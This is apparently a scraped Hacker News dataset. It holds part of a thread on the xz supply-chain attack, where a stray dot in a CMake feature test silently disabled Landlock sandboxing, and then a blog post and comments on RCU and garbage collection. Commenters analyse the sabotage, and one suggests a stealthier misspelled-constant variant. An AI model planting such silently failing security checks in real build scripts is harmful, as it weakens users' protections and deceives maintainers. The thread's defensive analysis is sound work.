ancestors. What would the sysadmin say if they find themselves in a restricted shell? reply bawolff 4 hours agoparentprevIts weird. Like i would consider doing two unrelated backdoor-esque things in the same project really sloopy. Seems like it just significantly increases the risk of being discovered for minimal gain. Its very confusing. Parts of this sega seem incredibly sophisticated while other parts seem kind of sloppy. reply kijin 2 hours agorootparentDude is a developer just like the rest of us. We all try to write clever code from time to time, but at other times write sloppy crap. Especially if there's a boss insisting on a tight deadline. reply clnhlzmn 10 hours agoprevWould it be reasonable to expect that this MR comes along with a test that shows that it does the thing it’s claiming to do? I’m not sure how that would work in this case.. have a test that is run on a system that is known to have landlock that does something to ensure that it’s enabled? Even that could be subverted, but it seems like demanding that kind of thing before merging “features” is a good step. reply masspro 9 hours agoparentI like the idea of testing build-system behaviors like this, and I don’t think it’s ever really done in practice. Scriptable build systems, for lack of a better name for them, exist at a bad intersection of Turing complete, hard to test different cases, hard to reason about, hard to read the build script code, and most of us treating them as “ugh I hope all this stuff works” and if it does “thank god I get to ignore all this stuff for another 6 months”. reply azakai 5 hours agorootparentIf you mean testing the \"disable Landlock if the headers and syscalls are out of sync\" functionality then I agree, workarounds for such corner cases are often not fully tested. But it would have been enough here to have a test just to see that Landlock works in general. That test would have broken with this commit, because that's what the commit actually does - break all Landlock support. Based on that it sounds like there wasn't a test for Landlock integration, if I've understood things correctly. reply adrianmonk 9 hours agoparentprevCreate a tiny fake version of landlock with just the features you're testing for. Since it's only checking for 4 #defines in 3 header files, that's easy. Then compile your test program against your fake header files (with -Imy-fake-includes). It should compile without errors even if landlock is missing from your actual system. Then build your test program a second time, this time against the real system headers, to test whether landlock is supported on your system. reply viraptor 9 hours agoparentprevI'd say this MR is a bad approach in general. The headers say what interfaces are known, not what features are available. You should be able to compile with landlock support on a system which doesn't enable it. Same situation as seccomp and others. Your build machine doesn't have to match the capabilities of the target runner. But yeah, to test it, you can have a mock version of landlock which responds with the error/success as you want, regardless of what the system would normally do. It relies on the test not being sabotaged too though... reply raimue 9 hours agorootparentRead the code of the check again. It mostly checks that the required SYS_* constants are defined to be able to use the syscalls. You can compile this on a system that does not have landlock enabled in the running kernel, but the libc (which imports the kernel system call interface) has to provide the syscall numbers. reply viraptor 9 hours agorootparentYou're right. I didn't see SYS... symbols being actually used, but they are: https://git.tukaani.org/?p=xz.git;a=blob;f=src/xz/sandbox.c;... This doesn't change my opinion in general - that version should be exposed through a library call and knowing about the specific syscalls shouldn't be needed in xv. reply Denvercoder9 8 hours agorootparentI see your point, but suggesting adding an additional library dependency while we're discussing a supply chain attack is quite ironic. reply viraptor 7 hours agorootparentShould've said function call not library call. My bad. Basically if you already have the linux/landlock.h, that should provide everything you need to do without explicit references to SYS... reply pxx 19 hours agoprevWhat was even the game here? Eventually even more backdoors, ones that would have more plausible deniability? Afaict neither the oss-fuzz nor this change would actually discover the found backdoor. But why put your backdoor eggs into one basket (library)? reply bayindirh 19 hours agoparentThe library is entrenched enough, trusted enough, and its main developer has long internet breaks because of mental health problems. Plus, you do not backdoor the library itself, but the tools using it. \"Reflections on trusting trust\" style. Sounds like a perfect plan, until it isn't. reply dagmx 10 hours agoparentprevWho says it was just the one library though? reply dylan604 10 hours agorootparentwaiting for a new bot to scan everyone's repos to find \".\" and then spam every repo with false positives reply leni536 1 hour agoprevOptional features should not depend on feature detection, ever. Feature detection for a security feature should be suspicious, even if it works as intended. Optional features should always be configured by whoever tries to compile the code. There can be defaults, but they shouldn't depend on the environment. reply snnn 9 hours agoprevSo for each optional feature we may need three build options: 1. Force enable 2. Enable if available 3. Force disable Like, --enable_landlock=always --enable_landlock --disable_landlock reply glandium 9 hours agoparentMy rule of thumb is that things should never be disabled automatically. Make the test hard fail and print a message that the feature can be disabled. reply cperciva 6 hours agorootparentIn my code I have a bunch of routines optimized for different platforms, e.g. using x86 AESNI instructions. Not all compilers support them, and they don't even make sense when compiling for a different CPU architecture. It's much simpler to say \"enable this if we can compile it\" rather than detecting the compiler and target platform and throwing a mess of conditional compilation into an autoconf script. reply ComputerGuru 7 hours agorootparentprevThat’s how you make unusable/uncompilable software. It might be a good rule for something security critical like ssh but not as a general rule. reply legobmw99 19 hours agoprevI’m not quite following what the diff here is suggesting - was this some cmake magic to detect if a feature was enabled, but the file had an intentional syntax error? reply db48x 10 hours agoparentAutoconf and CMake both compile small test programs to verify that the feature in question actually works. The test programs almost never actually do anything; the just refer to the feature of function that they rely on. If there is a compile or linker error then the feature isn’t available. In this case the compiler always outputs an error because the test program doesn’t have valid C syntax. Of course in practice you shouldn’t be writing each test program by hand. Autoconf has macros that generate them; you would only need to supply an identifier or at most a single line of code and the rest would be created correctly. I’m sure CMake is similar in that regard, so the first red flag is that they wrote a whole test program. reply bean-weevil 18 hours agoparentprevThat's exactly right. It was checking if the c code compiled to detect the landlock feature, and there was a single period in the middle of the code that made it always fail to compile and thus silently leave the feature disabled. reply jijijijij 18 hours agoprevI don't know enough about C and complex builds, but the proposed change appears to be kind of a red flag, even without the breaking dot. - check_include_file(linux/landlock.h HAVE_LINUX_LANDLOCK_H) ... + check_c_source_compiles(\" + #includeIs a compilation-test a legitimate/common/typical method to go about this? Yes—in fact, compilation tests are often the only way you can tell if a feature actually works. It's extremely common for C build systems to detect and work around weird systems. reply jijijijij 17 hours agorootparentIs this by design, or by legacy? I mean, is there a better way to do this? Seems really flawed to me. reply ninkendo 10 hours agorootparentIt’s by design. The job of autotools is to find “ground truth” about whatever environment you’re compiling against. It’s meant to discover if you can use a feature by actually seeing whether it works, not just by allow-listing a known set of compiler or library versions. This is because the whole point is to allow porting code to any environment where it’ll work, even on compilers you don’t know about. Think back to a time when there were several dozen Unix vendors, and just as many compilers. You don’t want your build script to report it can’t compile something just because it isn’t aware of your particular Unix vendor… you want it to only fail if the thing it’s trying to do actually doesn’t work. The only way to do this is by just testing if certain code compiles and produces the expected result. reply Aeolun 9 hours agorootparentI don’t know. In my code I’d always compile and check at runtime? reply ninkendo 8 hours agorootparentSome of the checks are there to tell whether or not the compiler even supports your code. You may not be able to compile your code at all, and the job of the build system is sometimes to just emit useful errors to help the person building the code to understand that they need a compiler which supports [language feature X]. Again, this is intended to be portable software. It is designed to work on lots of OS’s, with lots of compilers, in a lot of future environments that don’t even exist yet. If you have a security feature for example, which uses the pledge() syscall on OpenBSD, but you can only use that feature on OpenBSD systems, you have two choices: - Conditionally compile it based on whether you’ve detected that this is an OpenBSD target at build time, or, - Conditionally compile it based on whether some sample code that uses pledge() builds successfully. You can’t defer this decision until runtime, because it would require linking to pledge() symbols even though they may not exist on this system, which would cause the executable to fail to link at runtime, unless you completely rearchitected to use a plugin model, which is overkill. So given the above are your main two options, the latter is preferred mainly because it allows new systems to come in and be compatible with old ones (maybe someone adds pledge() support to Linux one day) without having to fudge the uname command or something. This was super important in the early Unix days… perhaps less so now, but it’s still a good way to write portable software that still can take advantage of platform-specific features. reply jiggawatts 4 hours agorootparent> Again, this is intended to be portable software. A scathing criticism of the OpenSSL library by the BSD team was that it was too portable in a (very real) sense that it wasn't even written in \"C\" any more, or targeting \"libc\" as the standard library. It would be more accurate to say that it was \"Autotools/C\" instead. By rewriting OpenSSL to target an actual full-featured libc, they found dozens of other bugs, including a bunch of memory issues other than the famous Heartbleed bug. Platform standards like the C++ std library, libc, etc... are supposed to be the interface against which we write software. Giving that up and programming against megabytes of macros and Autotools scripts is basically saying that C isn't a standard at all, but Autotools is. Then just admit it, and say that you're programming in the Autotools standard framework. Be honest about it, because you'll then see the world in a different way. For example, you'll suddenly understand why it's so hard to get away from Autotools. It's not because \"stuff is broken\", but because it's the programming language framework you and everyone else is using. It's like a C++ guy lamenting that he needs gcc everywhere and can't go back to a pure C compiler. Job ads should be saying: \"Autotools programmer with 5 years experience\" instead of \"C programmer\". It would be more accurate. PS: I judge languages by the weight of their build overhead in relation to useful code. I've seen C libraries with two functions that had on the order of 50kb macros to enable them to build and interface with other things. reply tsimionescu 2 hours agorootparentC basically has no standard library. It's no surprise to anyone who has ever used it more than in passing that you depend on the chosen build system to replace that. Building portable C libraries is very different because of this from any other commonly used programming language - even C++. reply ksherlock 8 hours agorootparentprevYou'll never make it to runtime if you try to include headers that don't exist. You'll never make it to runtime if you try to link in libraries that don't exist. reply Denvercoder9 9 hours agorootparentprevNot everything is detectable at runtime, such as syscall numbers (which is what's being tested for here). reply manwe150 5 hours agorootparentRuntime syscall number detection is very common in practice, since the kernel returns ENOSYS to enable that exact ability for glibc and other shim libraries reply cryptonector 9 hours agorootparentprevIt's not by design, unlike what siblings say. It's by accident (so, \"legacy\", as you put it). The problem is that already in the 80s there was tons of variability from on Unix system (or version of it) to the next, but there was no standard way of representing what features/standards/APIs/libraries a system supported or had installed. When faced with such a mess people wrote code to detect features are present on the target host. This then got made into tools with libraries of detection code. Think autoconf/autotools. Now we also have pkgconfig, but it's too late and it was not enough anyways. Some things you might only detect at run-time, provided that their ABIs are stable enough that you can copy their headers into your application. reply db48x 10 hours agorootparentprevIt’s by “design”, in the sense that C and C++ provide no better way to really know for sure that the functions you want to call really exist. In more modern languages we rely on metadata and semver, but none of that exists for C and C++. reply kllrnohj 9 hours agorootparentHey, leave C++ out of this. This is a C problem. https://en.cppreference.com/w/cpp/feature_test reply Denvercoder9 8 hours agorootparentThat only works for language features though, it doesn't allow detecting OS/library features. reply db48x 4 hours agorootparentVery true, but don’t forget that Autoconf checks for “interesting” compiler choices as well as library and OS features. And then there is libtool, which abstracts out the differences between how compilers generate shared libraries so that you only have to understand one way of doing it and it will work on all of them. reply cryptonector 4 hours agorootparentAutoconf lets you check for all sorts of things: - instruction set architecture - OS versions - ABIs - libraries (whether they are installed) - and what functionality they provide - commands/executables - anything you can write a macro to check All stuff too disparate to reliably have the OS be able to answer every question you might have about it and the stuff installed on it. You can't wait for any such system to learn how to answer the questions you might have about it, so some things you can only detect, either at build configuration time, build time, or run time. reply uecker 10 hours agorootparentprevI never test for this in this way in my C projects. I also rely on version tests only. reply db48x 9 hours agorootparentYea, it’s not impossible to do, just not standardized. If you use a library and it provides useful version information, then definitely use it. It’s just that the language or the tooling doesn’t force libraries to have that kind of metadata. Compare that with Rust, where every library you use must come with a standardized manifest that includes a version number, and where they tell library authors up front that they are expected to follow the semver convention. The fact is that things have good easier over the last 10 or 20 years. It used to be the case that any program targeting Unix had to either spend a lot of time and energy tracking the precise differences between dozens of different commercial Unices, or use autoconf. Autoconf was the project that combined all of that lore into a single place, so that most people didn’t have to know every single detail. But these days most of the Unices are dead and buried, and 99% of all new projects just target Linux. Kinda sucks if you prefer one of the BSDs, or OpenSolaris/Illumos/SmartOS, but it does mean that new Linux developers never have to jump through those hoops and simply never learn about autoconf. And while on the one hand that represents a loss of knowledge and competency for the community (making this type of supply–chain attack much easier), on the other hand autoconf is in practice an abomination. It is (or at least was) extremely useful, but it was implemented in M4 and reading the source code will literally damage your brain. reply acdha 8 hours agorootparent> It used to be the case that any program targeting Unix had to either spend a lot of time and energy tracking the precise differences between dozens of different commercial Unices, or use autoconf. Autoconf was the project that combined all of that lore into a single place, so that most people didn’t have to know every single detail. As a data point, the place I worked for in the mid-90s had a single codebase with something over 600 permutations of supported OS and compiler when you included the different versions. One thing we take for granted now is how easy it is to get and install updates – back then you might find that, say, a common API was simply broken on one particular operating system version but your customers would have to wait for a patch to be released, sometimes purchased, put onto floppy disks or CD-ROM, and then manually installed in a way which had enough risk involved that people often put it off as long as they could. Some vendors also did individual patches which could be combined by the sysadmin so you had to test for that specific feature rather than just saying “is it greater than 1.2.3?”, and it wasn’t uncommon to find cases where they’d compiled a common library with some weird patches so you had to test whether the specific features you needed functioned. Part of why Linux annihilated them was cost but much of it was having package managers designed by grownups - I remember as late as the mid-2000s bricking brand new Sun servers by running the new Solaris updater, which left them in an unbootable state. reply db48x 4 hours agorootparentAh, wacky fun. https://youtu.be/yHPvOeahQnc?t=87 reply kccqzy 10 hours agorootparentprevHave you ever tried to manually build something from a release tarball by starting with ./configure? If so, have you observed how many times the compiler is invoked in this configure phase before you even run make? reply secondcoming 10 hours agorootparentprevBack in the day when people compiled source from tarballs on their personal machines, the autoconf script would query your system to see what functionality it supported. It did this by trying to compile small programs for each feature. If the compilation failed it assumes the feature is unavailable on your system and a flag is set/unset for the rest of the build. reply Nezghul 1 hour agorootparentprevThat \"check_c_source_compiles\" function should first test if the provided code snipped is \"valid C code in general\" and only then check if it compiles in given system. reply danieldk 19 hours agoprevCommit that introduced this: https://git.tukaani.org/?p=xz.git;a=commit;h=328c52da8a2bbb8... reply JSDevOps 18 hours agoprevYeah, I wasn't sure what the diff is alluding to here but I assume \"mysandbox\" could remain undetected (enabled/disabled) for whatever reason. reply IshKebab 2 hours agoprevThis is surprisingly obvious. I mean it's a clever technique to disable the feature and a really plausible commit. But then why did they go with an obvious syntax error instead of just misspelling something. E.g. would you have spotted it if the mistake was `PR_SET_NO_NEW_PRIV`? More plausibly deniable too. reply GrayShade 19 hours agoprevOnly in CMake, this time. Not in the autotools version. reply almostnormal 8 hours agoparentDoes autotools compile only, or try to link? There's no main(). reply jwilk 3 hours agorootparentAC_COMPILE_IFELSE indeed only compiles, so there's no need for main(). There's AC_LINK_IFELSE if you want to test linking too. reply jan3000 6 hours agorootparentprevThere is a main()...[0] [0] https://git.tukaani.org/?p=xz.git;a=blob;f=CMakeLists.txt;h=... reply jwilk 3 hours agorootparentThat's not autotools. reply acqq 1 hour agoprev [–] Now I'd like to have a link to that patch in code used by Apple that also appeared as a typo. Anybody remembers? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "A commit in the xz.git repository addresses the Linux Landlock feature test in Autotools and CMake builds by including a compile check to verify the availability of essential syscalls for Linux Landlock usage.",
      "When the required syscalls are available, the SANDBOX_COMPILE_DEFINITION is configured as \"HAVE_LINUX_LANDLOCK,\" and SANDBOX_FOUND is enabled to support compatibility with the Landlock sandboxing technique in XZ Utils."
    ],
    "commentSummary": [
      "A single character issue in the Xz project disabled the Linux landlock access control system, igniting discussions on preventing similar attacks using non-standard characters in source code.",
      "The incident underscores the importance of error-handling in feature detection snippets and highlights challenges with whitespace, tabs, and spaces in Python coding.",
      "Discussions cover intentional tampering in software development, complexities of testing and security, removal of landlock functionality, security implications of feature detection, challenges of writing portable software, and advancements in library versioning and package management."
    ],
    "points": 358,
    "commentCount": 195,
    "retryCount": 0,
    "time": 1711803363
  },
  {
    "id": 39873692,
    "title": "Unlocking Efficiency: RCU and Garbage Collection in Systems Programming",
    "originLink": "https://bitbashing.io/gc-for-systems-programmers.html",
    "originBody": "Let’s talk about one of the most performance-sensitive programs you run every day: your operating system. Since every speedup gives you more computer to compute with, an OS is never fast enough, so you can always find kernel and driver developers optimizing the bejesus out of their code. Operating systems also need to be massively concurrent. Not only is your OS scheduling all userspace processes and threads, but a kernel has many threads of its own, as well as interrupt handlers to interact with your hardware. You want to minimize time spent waiting around, because again, you’re robbing your users any time you do. Put these two goals together and you’ll find many strange and magical methods for locklessly sharing data between threads.1 Let’s talk about one of those. Let’s talk about RCU. RCU Say we have data that is read constantly but written rarely—something like the set of USB devices currently plugged in. In computer years this set changes once a millennium, but it can change. And when it does, it should change atomically, without blocking any readers that happen to be taking a peak. A surprisingly simple solution is to have the writer: Read the existing data from a pointer.2 Copy it, and apply the changes needed to make the next version. Atomically update the pointer so it points at the new version. We might call this strategy, uh, Read, Copy, Update. As code, it resembles something like: // Some big ball of state... struct Foo { int lots; string o; big_hash_map fields; }; // ...is shared between readers and writer by this pointer. atomic sharedFoo; // Readers just... read the pointer. const Foo* readFoo() { return shared_foo.load(); } // The writer calls this to atomically update our shared state. // (Wrap this in a mutex to make it multi-producer, multi-consumer, // but let's assume the common single-producer scenario here.) void updateFoo() { const Foo* old = shared_foo.load(); // Read const Foo* updated = makeNewVersion(old); // Copy sharedFoo.store(updated); // Update } Awesome! It’s easy to use, it’s wait-free, and it leaks like a sieve. Well that’s bad. Could we just delete the data? void updateFoo() { const Foo* old = shared_foo.load(); // Read const Foo* updated = makeNewVersion(old); // Copy sharedFoo.store(updated); // Update delete old; // DANGER WILL ROBINSON } No, actually. Not unless you like use-after-free bugs. This is all happening locklessly, so how do we know there aren’t still readers looking at that old version? Here a reader (R2 in green) is still using the old version after the writer (in purple) has updated the shared pointer. Subsequent readers (like R3) will see the new version, but the writer doesn't know when R2 will finish! Could readers, um, just tell us? void someReader() { // Tell the writer that someone is reading. rcu_read_lock(); const Foo* f = readFoo(); doThings(f); // Tell the writer we're done. rcu_read_unlock(); } This defines a sort of read-side critical section—readers still never block, but they can make the writer wait to axe any data they’re still looking at. void updateFoo() { const Foo* old = shared_foo.load(); // Read const Foo* updated = makeNewVersion(old); // Copy sharedFoo.store(updated); // Update // Wait for current readers to \"unlock\" // and leave their critical sections. rcu_synchronize(); delete old; } And so, Notice that we don't wait until there's zero readers—once again, R3 gets the new version of the data, so it doesn't care about the fate of whatever came before it. rcu_synchronize() just needs to wait for previous readers—ones which might be looking at old—to finish. Normal people would be content with this solution, but kernel developers aren’t normal people. We’ve got a blocking writer now, and even though we weren’t optimizing the writer side, blocking still makes them very sad. Suppose we don’t wait around in our update function to free the old data. Our code is correct so long as that happens eventually, right?. What if we “deferred” that? void updateFoo() { const Foo* old = shared_foo.load(); // Read const Foo* updated = makeNewVersion(old); // Copy sharedFoo.store(updated); // Update // Our cool library can free `old` any time after // current readers leave their critical sections. rcu_defer(old); } All’s well if we free old anywhere in squiggly time. We could even have a dedicated thread occasionally sweep through all the old, unreferenced versions of the data and… …wait, did we just build a generational garbage collector? Of immutable data structures, no less? Wat This isn’t some thought experiment—RCU is very real, and very useful. Linux uses it tens of thousands of times. It’s provided in Facebook’s Folly C++ library. And in Rust it goes by crossbeam-epoch and underpins one of the most popular concurrency libraries. Therapist: Kernel garbage collection isn't real and it can't hurt you. Kernel garbage collection: At this point, some folks fire back with non-arguments about how this isn’t “real” garbage collection. Like, uh, because you manually mark the garbage! I’m not here to argue taxonomy—whatever you want to call it, RCU has the same shape as GC: memory is cleaned up eventually, based on whether it’s still in use.3 And it’s an interesting example that cuts against the prevailing wisdom that garbage collection is: Slower than manual memory management Takes away the fine-grained control you need when writing systems software These arguments are clearly bullshit for RCU, which is motivated by performance and latency demands, not used as a convenience in spite of its costs. And we’re not doing any extra work, we’re just moving it out of the critical path. …Are these arguments just generally bullshit, too? GC is not magically slow, OR: malloc() is not magically fast The common wisdom that garbage collectors are inherently less efficient than traditional/manual memory management falls apart pretty quickly when you look into the details of how these things actually work. Consider: free() is not free. A general-purpose memory allocator has to maintain lots of internal, global state. What pages have we gotten from the kernel? How did we split those up into buckets for differently-sized allocations? Which of those buckets are in use? This gives you frequent contention between threads as they try to lock the allocator’s state, or you do as jemalloc does and keep thread-local pools that have to be synchronized with even more code. Tools to automate the “actually freeing the memory” part, like lifetimes in Rust and RAII in C++, don’t solve these problems. They absolutely aid correctness, something else you should care deeply about, but they do nothing to simplify all this machinery. Many scenarios also require you to fall back to shared_ptr/Arc, and these in turn demand even more metadata (reference counts) that bounces between cores and caches. And they leak cycles in your liveness graph to boot. Modern garbage collection offers optimizations that alternatives can not. A moving, generational GC periodically recompacts the heap. This provides insane throughput, since allocation is little more than a pointer bump! It also gives sequential allocations great locality, helping cache performance. The Illusion of Control Many developers opposed to garbage collection are building “soft” real-time systems. They want to go as fast as possible—more FPS in my video game! Better compression in my streaming codec! But they don’t have hard latency requirements. Nothing will break and nobody will die if the system occasionally takes an extra millisecond.4 But even when we’re not on the Night Watch, we don’t want to randomly stop the world for some garbage collector, right? Lies people believe about memory management The programmer can decide when memory management happens. The wonderful thing about an operating system is that it abstracts our interactions with hardware. The terrible thing about an operating system is that it abstracts interactions with hardware. Linux, by default, does almost nothing when asked for memory, only handing it out once you actually try to use it. In our wacky world of madvise(), memory-mapped I/O, and file system caches, there’s no simple answer to, “what’s allocated and when?” We can only hint at our intentions, then let the OS do its best. Usually it does a great job, but on a bad day, a simple pointer access can turn into disk I/O! The programmer knows the best times to pause for memory management. Sometimes there are obvious answers—like on the loading screen of a video game. But the only obvious answer for lots of other software is just, “whenever we’re not busy with more critical work.” Our friends shared_ptr and Arc cloud our reasoning here, too—individual pieces of code holding a reference-counted pointer can’t know a priori if they’re going to be the last owner stuck with the cleanup. (If they could know, we wouldn’t need reference counting there!) Calling free() gives the memory back to the OS. Memory is allocated from the operating system in pages, and the allocator often holds onto those pages until the program exits. It tries to reuse them, to avoid bugging the OS more than necessary. Not to say the OS can’t take pages back by swapping them out… Takeaways I’m not suggesting that all software would benefit from garbage collection. Some certainly won’t. But it’s almost 2024, and any mention of GC—especially in my milieu of systems programmers—still drowns in false dichotomies and FUD. GC is for dum dums, too lazy or incompetent to write an “obviously” faster version in a language with manual memory management. It’s just not true. It’s ideology. And I bought it for over a decade until I joined a team that builds systems—systems people bet their lives on—that provide sub-microsecond latency, using a garbage-collected language that allocates on nearly every line. It turns out modern GCs provide amazing throughput, and you don’t need to throw that out for manual memory management just because some of your system absolutely needs to run in n clock cycles. (Those specific parts can be relegated to non-GC code, or even hardware!) Garbage collection isn’t a silver bullet. We don’t have those. But it’s another tool in the toolbox that we shouldn’t be afraid to use. To be fair, you’ll also find plenty of normal mutexes and spinlocks too. ↩ We could even read the pointer without the usual atomic load-acquire semantics, establishing our ordering with nothing more than the CPU pipeline’s data dependency between the pointer and the values it points to. But the tragedy of memory_order_consume is a story for another day. ↩ In an ill-advised response to, “no, the author is an idiot, RCU isn’t GC at all since quiescent-state RCU in the Linux kernel provides guarantees about when cleanup happens, and on a regular cadence” — this is an amazing optimization the kernel can make given that it has total control over when context switches occur. That doesn’t change that call_rcu() is for moving cleanup out of the the context where it is called, and the example the kernel docs provide is… freeing data! Also look at any userspace implementation of RCU, including one by the same folks who introduced it to the kernel. You’ll find the same notions of deferring cleanup to some later time. And when your program can’t manually indicate quiescent states with no read-side critical sections, implementations use some notion of generations separated by those critical sections. ↩ Systems that do have hard real-time requirements are a whole different game. Have fun plumbing interrupt handlers through an RTOS, or writing drivers for FPGAs and custom circuitry. And you’re definitely not allocating anything after startup. ↩",
    "commentLink": "https://news.ycombinator.com/item?id=39873692",
    "commentBody": "Garbage collection for systems programmers (2023) (bitbashing.io)322 points by ingve 20 hours agohidepastfavorite173 comments teleforce 18 hours agoFor promising modern and parallel GC techniques please check MPL or MaPLe with its novel Automatic Management of Parallelism. It won distinguished paper award in POPL 2024 and ACM SIGPLAN dissertation award 2023 by proposing these two main things [1],[2]: a) Provably efficient parallel garbage collection based on disentanglement b) Provably efficient automatic granularity control [1] MaPLe (MPL): https://github.com/MPLLang/mpl [2] Automatic Parallelism Management: https://dl.acm.org/doi/10.1145/3632880 reply bool3max 15 hours agoparentWhat does \"provably efficient\" mean? reply zogrodea 14 hours agoparentprevStandard ML and the community around it has been pretty impressive as far as contributions to memory management literature goes. There is of course the paper you linked, and there's also the MLKit which was among the first users, and one of the pioneers, of region-based memory management. reply prisenco 4 hours agoparentprevQuestion for people who are more qualified: How applicable is this to other languages? Could this approach significantly speed up garbage collection in Go for example? Or do we run into design issues with existing languages? reply amelius 12 hours agoparentprevHow does this compare against recent efforts in OCaml to support multicore parallelism? reply zogrodea 9 hours agorootparentOne of the people who helped optimise the multi core implementation for OCaml said it was the way to go, but that was in 2020. Don’t know where things are now. https://news.ycombinator.com/item?id=23776609 reply pjmlp 15 hours agoparentprevGreat material, thanks for sharing. reply bugbuddy 18 hours agoparentprevNice links. Thanks for posting these. reply celrod 18 hours agoprevThe RCU use case is convincing, but my experience with GCs in other situations has been poor. To me, this reads more like an argument for bespoke memory management solutions being able to yield the best performance (I agree!), which is a totally different case from the more general static lifetimes generally outperforming dynamic lifetimes (especially when a tracing step is needed to determine liveness). > Lies people believe... Calling free() gives the memory back to the OS. I believe calling `free()` gives the memory back to the allocator, which is much better than giving it to the OS; syscalls are slow. Perhaps not immediately; mimalloc only makes frees available to future `malloc`s periodically. Trying a simple benchmark where I allocate and then immediately `free` 800 bytes, 1 million times, and counting the number of unique pointers I get: glibc's malloc: 1 jemalloc: 1 mimalloc: 4 Julia's garbage collector: 62767 62767, at about 48 MiB, isn't that bad, but it still blows out my computer's L3 cache. Using a GC basically guarantees every new allocation is from RAM, rather than cache. This kills performance of any heavily allocating code; we don't care only about how fast memory management can work, but how quickly we can worth with what it gives us. I gave a benchmark in Julia showcasing this: https://discourse.julialang.org/t/blog-post-rust-vs-julia-in... Malloc/free gives you a chance at staying hot, if your actual working memory is small enough. Allocators like mimalloc are also designed (like the compacting GC) to have successive allocations be close together. The 4 unique pointers I got from mimalloc were 896 bytes apart. My opinions might be less sour if I had more experience with compacting GCs, but I think GCs are just a vastly more complicated solution to the problem of safe memory management than something like Rust's borrow checker. Given that the complexity is foisted on the compiler and runtime developers, that's normally not so bad for users, and an acceptable tradeoff when writing code that isn't performance sensitive. Similarly, RAII with static lifetimes is also a reasonable tradeoff for code not important enough for more bespoke approaches. The articles example is evidently one of those deserving a more bespoke solution. reply chc4 17 hours agoparentIt's really not enough to just say that a GC gave you more pointers = it has worse cache locality. Compacting GC almost always has better cache utilization than malloc, because heap fragmentation over long-running programs will waste TLB cache entries and slack space between objects. A bump allocator from a compacting GC will give you a new pointer for each allocation because free doesn't reclaim the memory...but those allocations will be sequentially, and if you were in the case where you are churning through your heap and only ever touch the most recent object they will always be in cache still. Benchmarking the knock-on effects of allocators and GCs are insanely difficult and I'm very skeptical of basically any synthetic benchmarks like this. reply hedora 17 hours agorootparentI think the fact that it is complicated to reason about is precisely why systems developers don’t trust GC’s. It’s far easier to write a threadsafe bump (slab) allocator than to locate and diagnose the code that someone wrote two years ago and, as of last week, started causing the GC to blow up the cache, contend on a lock, fragment the heap, add unbounded pauses, burn an extra cpu, etc, etc. (Though, at this point, most mallocs are so good that the slab allocator loses anyway and there’s no need to bother.) reply celrod 17 hours agorootparentprevFWIW, that synthetic benchmark was reflective of some real world code we were deploying. Using malloc/free for one function led to something like a 2x performance improvement of the whole program. I think it's important to differentiate between malloc implementations/algorithms, just like it's important to differentiate between GCs. E.g., mimalloc \"shards\" size classes into pages, with separate free lists per page. This way, subsequent allocations are all from the same page. Freeing does not free eagerly; only if the entire page is freed, or if we hit a new allocation and the page is empty, then it can hit a periodic slow path to do deferred work. https://www.microsoft.com/en-us/research/uploads/prod/2019/0... Good malloc implementations can also employ techniques to avoid fragmentation. It's unfortunate that the defaults are bad. But I confess, compacting GCs and profiling the effects of heap fragmentation (especially over time in long running programs) are both things I lack experience in. Microbenchmarks are unlikely to capture that accurately. reply convolvatron 17 hours agorootparentprevcompaction really does help runtimes alot. but I'm not sure how much it really has to do with line level locality. in general we don't try to batch related objects together except in a coarse form by generation. I think the measurable benefit comes from page level savings, both reducing the number of trips to the kernel to get zeroes pages, and from reduced pressure on the tlb. but I have definitely seen numbers like 20% on some workloads for turning on compaction reply tsimionescu 45 minutes agorootparent> in general we don't try to batch related objects together except in a coarse form by generation. It greatly depends on the GC algorithm, right? Copying collectors naturally bunch up related objects (though of course, in which order is less well defined, if one object has multiple pointers to others). reply arcticbull 13 hours agoparentprevThe post explains why this works in the RCU context, why it sucks in general, and then just writes it off and ignores it. > At this point, some folks fire back with non-arguments about how this isn’t “real” garbage collection. Like, uh, because you manually mark the garbage! Yeah. People's concerns are that the process of figuring out what memory is not longer used is inefficient and non-deterministic relative to simply telling the allocator when you're done with a resource. I've never met someone who's been concerned with deferring deallocation. Sure traversing the whole live set is rare and we've spent 30 years tweaking GC algorithms to make them better, and now they're practically sentient. However this statement either willfully or unintentionally writes off the thing people actually have an issue with. If you run into GC issues in your services you have to bring in a shaman to tweak things here and there hoping it sends the angry spirits back to the shadow realm. If you're just marking the garbage and being notified when it's no longer used, that entire process is gone. Yes, it can be very fast to allocate memory in a GC. This ignores the cost of marking and compaction that actually need to be amortized in to get a fair comparison. The other big issue people have with GC is that in general it requires significantly more memory than manual memory management to achieve equivalent performance. And you have to have a bunch of extra CPU power to throw at redundantly checking if things are still referenced over and over. And you have to be okay with a bunch of extra memory copies for optimistic compaction. Finally the post criticizes manual memory management (Rust's Arc/Rc) as being necessary when you have unclear lifetimes - but ignores that you basically build the exact same infrastructure in GC'd languages to close external resources as you can't rely on finalizers ever being called. Anyways this has been beaten to death for the last 20-30 years and this article doesn't seem to bring anything new to the table besides ignoring the legitimate concerns of a GC using memes, which is fine because memes are fun IMO. The correct answer is exactly what you say - there is no general correct answer. You use the tool appropriate to the job to meet the design constraints of the system. reply rerdavies 7 hours agorootparent> I've never met someone who's been concerned with deferring deallocation. Realtime audio processing (instruments and effects), where malloc/free can never be called on the realtime audio thread. Deallocations have to be deferred. If it matters for realtime audio, I cannot imagine that it would not matter for twitch games as well. In non-GC languages the audio thread can be kept running even when changing audio plugins, as long as allocations and deallocations are not performed on the audio thread. Realtime audio synthesis is possible in .net; but no memory allocations can occur anywhere in the entire realtime audio process. It is possible to write allocation-free message queues between a UI process and a realtime process. If allocations do occur in the realtime audio process, the realtime thread has to be suspended at some point in order to grab object references on the stack of the realtime thread -- a process that can take 2ms or more in .net GCs (which is more than enough to case audio dropouts).[1] reply pclmulqdq 6 hours agorootparentMany of the systems I have seen that need to be deterministic and fast but still need to allocate will use pool allocators or slab allocators. The edge cases mean that malloc/free is not in the conversation. I suppose that pre-allocating objects and deferring deallocation would also work, but that seems roughly equivalent to pool allocation. The null allocator is the fastest allocator, though! reply rerdavies 6 hours agorootparentYes. Lots of pool allocators as well. :-) The principle application is making changes to Audio plugin chains without stopping the real-time audio thread. The new chain has to be pre-allocated, and the old chain has to be sent off-thread to get deallocated on a deferred basis. You can't pool-allocate a VST or an LV2 audio plugin. Data subscriptions (Audio VU data and control port values) also use a similar deferred deallocation scheme. Doing so allows use of mutexes and shared ptrs in dependent non-realtime data 